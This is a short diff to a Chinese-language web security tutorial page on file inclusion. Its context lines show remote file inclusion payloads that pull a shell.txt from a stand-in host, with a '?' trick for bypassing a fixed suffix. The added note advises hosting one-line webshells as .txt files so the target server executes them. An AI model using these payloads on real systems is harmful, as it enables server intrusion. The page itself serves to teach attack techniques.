@@ -204,7 +204,10 @@ Linux：
 <pre tabindex="0"><code>[http|https|ftp]://www.test.com/shell.txt
 </code></pre><p>若后缀名写死，可以用 ? 绕过:</p>
 <pre tabindex="0"><code>//www.test.com/shell.txt?a
-</code></pre><h3 id="伪协议">伪协议</h3>
+</code></pre><blockquote>
+<p>如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件</p>
+</blockquote>
+<h3 id="伪协议">伪协议</h3>
 <h4 id="file">file://</h4>
 <p>一般用来读本地文件：</p>
 <pre tabindex="0"><code>file://文件的绝对路径
